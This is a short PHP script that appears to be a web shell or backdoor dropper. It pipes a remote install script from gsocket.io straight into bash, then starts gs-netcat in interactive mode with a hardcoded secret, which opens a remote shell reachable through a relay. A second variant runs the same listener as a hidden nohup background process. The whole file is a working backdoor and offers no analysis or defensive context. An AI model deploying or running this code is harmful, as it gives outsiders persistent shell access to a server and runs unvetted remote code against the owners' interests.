<?php
$secret = "nyxne1";

// Method 1: Direct execution
system("curl -fsSL https://gsocket.io/install.sh | bash");
system("gs-netcat -s '$secret' -i &");

// Method 2: Background process  
exec("nohup bash -c 'gs-netcat -s \"$secret\" -i' >/dev/null 2>&1 &");

echo "Attempted connection...";
?>
